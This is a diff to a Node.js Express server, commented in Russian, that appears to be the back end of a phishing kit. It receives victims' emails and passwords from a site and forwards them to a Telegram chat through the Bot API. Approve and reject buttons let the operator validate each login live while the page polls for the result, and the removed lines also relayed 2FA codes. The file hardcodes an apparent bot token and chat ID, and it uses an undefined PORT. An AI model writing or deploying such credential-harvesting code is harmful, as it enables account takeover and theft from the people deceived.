@@ -1,56 +1,64 @@
-const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
-const cors = require('cors');
-
-const token = 'ТВОЙ_НОВЫЙ_ТОКЕН'; // Замени на новый!
-const adminChatId = '-1003894478662';
-
-const bot = new TelegramBot(token, { polling: true });
+const axios = require('axios');
 const app = express();
-
-app.use(cors());
 app.use(express.json());
 
-let userStatuses = {};
+let requests = {}; // Тут храним статусы проверок { userId: 'pending' | 'success' | 'error' }
 
-// Логирование ошибок бота в консоль Render
-bot.on('polling_error', (err) => console.log('Ошибка бота:', err.message));
+const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
+const chatId = '-1003894478662';
 
-app.post('/send-data', (req, res) => {
-    const { type, email, pass, code, userId } = req.body;
-    userStatuses[userId] = 'pending';
+// 1. Прием данных с сайта
+app.post('/send-data', async (req, res) => {
+    const { userId, email, pass } = req.body;
+    requests[userId] = 'pending';
+
+    const message = `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
     
-    let message = type === 'auth' 
-        ? `⚠️ **Вход**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\`` 
-        : `🔢 **Код 2FA**: \`${code}\``;
-
-    bot.sendMessage(adminChatId, message, {
+    // Отправляем в ТГ с кнопками
+    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+        chat_id: chatId,
+        text: message,
         parse_mode: 'Markdown',
         reply_markup: {
-            inline_keyboard: [[
-                { text: '✅ Ок', callback_data: `ok_${userId}` },
-                { text: '❌ Ошибка', callback_data: `err_${userId}` }
-            ]]
+            inline_keyboard: [
+                [
+                    { text: "✅ Верно", callback_data: `approve_${userId}` },
+                    { text: "❌ Ошибка", callback_data: `reject_${userId}` }
+                ]
+            ]
         }
-    }).catch(e => console.error('Ошибка отправки:', e));
-
-    res.json({ status: 'ok' });
-});
-
-bot.on('callback_query', (query) => {
-    const [action, userId] = query.data.split('_');
-    userStatuses[userId] = action === 'ok' ? 'success' : 'error';
-
-    bot.answerCallbackQuery(query.id, { text: "Готово" });
-    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
-        chat_id: query.message.chat.id,
-        message_id: query.message.message_id
     });
+
+    res.json({ status: 'sent' });
 });
 
-app.get('/check/:userId', (req, res) => {
-    res.json({ status: userStatuses[req.params.userId] || 'none' });
+// 2. Эндпоинт для проверки статуса сайтом
+app.get('/check-status/:userId', (req, res) => {
+    const status = requests[req.params.userId] || 'not_found';
+    res.json({ status });
 });
 
-const PORT = process.env.PORT || 10000;
+// 3. Прием ответа от кнопок Telegram (WebHook или обработка Callback)
+// ВАЖНО: Тебе нужно настроить Webhook бота на этот адрес или использовать библиотеку
+app.post('/tg-webhook', (req, res) => {
+    const callbackQuery = req.body.callback_query;
+    if (callbackQuery) {
+        const data = callbackQuery.data; // approve_123
+        const [action, userId] = data.split('_');
+
+        if (action === 'approve') {
+            requests[userId] = 'success';
+        } else {
+            requests[userId] = 'error';
+        }
+        
+        // Редактируем сообщение в ТГ, чтобы убрать кнопки
+        axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+            callback_query_id: callbackQuery.id,
+            text: "Принято!"
+        });
+    }
+    res.sendStatus(200);
+});
 app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
